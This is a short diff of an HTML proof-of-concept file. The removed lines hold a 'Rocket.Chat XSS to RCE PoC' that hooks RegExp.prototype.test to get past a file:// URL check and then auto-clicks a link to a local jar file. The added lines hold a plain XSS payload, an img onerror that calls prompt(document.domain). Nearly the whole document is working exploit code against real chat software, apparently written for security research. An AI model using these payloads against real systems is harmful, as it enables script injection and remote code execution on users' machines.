@@ -1,24 +1,2 @@
-<!DOCTYPE html>
-<html>
-    <head>
-      <script>
-        RegExp.prototype.test = new Proxy(RegExp.prototype.test, {
-          apply: function(target, thisArg, argumentsList) {
-          if((thisArg.source == '^file:\\/\\/.+') && (argumentsList[0] === 'file:////home/madara/burploader.jar/')){
-            return false;
-          }
-          return Reflect.apply(target, thisArg, argumentsList)
-          }
-        });
-        setTimeout(()=>{
-            a = document.createElement("a")
-            a.href="file:////home/madara/burploader.jar/"
-            document.body.appendChild(a)
-            a.click()
-        }, 3000);
-      </script>
-    </head>
-    <body>
-     <h1>Rocket.Chat XSS to RCE PoC</h1>
-    </body>
-</html>
+<h1>boom</h1>
+"><img src=x onerror=prompt(document.domain)
